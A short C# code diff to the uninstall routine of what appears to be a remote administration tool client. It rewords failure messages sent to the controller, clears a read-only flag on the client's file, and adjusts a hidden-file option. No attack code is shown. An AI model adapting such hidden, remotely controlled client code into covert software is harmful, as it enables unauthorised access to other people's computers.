@@ -14,7 +14,7 @@ namespace xClient.Core.Installation
         {
             if (!Settings.INSTALL)
             {
-                new Packets.ClientPackets.SetStatus("Can not uninstall client. Installation was not enabled.").Execute(client);
+                new Packets.ClientPackets.SetStatus("Uninstallation failed: Installation is not enabled").Execute(client);
                 return;
             }
 
@@ -25,7 +25,10 @@ namespace xClient.Core.Installation
 
             try
             {
-                string batchFile = FileHelper.CreateUninstallBatch(Settings.HIDEFILE);
+                if (!FileHelper.ClearReadOnly(ClientData.CurrentPath))
+                    new Packets.ClientPackets.SetStatus("Uninstallation failed: File is read-only").Execute(client);
+
+                string batchFile = FileHelper.CreateUninstallBatch(Settings.INSTALL && Settings.HIDEFILE);
 
                 if (string.IsNullOrEmpty(batchFile)) return;
 
